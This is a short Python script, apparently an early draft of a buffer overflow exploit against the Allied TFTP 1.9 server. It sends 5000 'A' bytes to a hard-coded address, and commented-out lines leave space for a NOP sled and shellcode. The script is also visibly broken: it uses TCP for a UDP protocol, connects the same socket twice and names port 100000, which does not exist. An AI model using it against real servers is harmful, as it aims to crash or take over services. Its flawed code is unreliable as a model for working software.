#!/usr/bin/env python

#buffer overflow for allied TFTP 1.9

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('10.11.4.94', 69))
sock.connect ((sys.argv[1], 100000))



buffer = "A"*5000

#buffer += ""

#buffer += "\x90"*20

#buffer += ()

sock.send(buffer)



sock.close()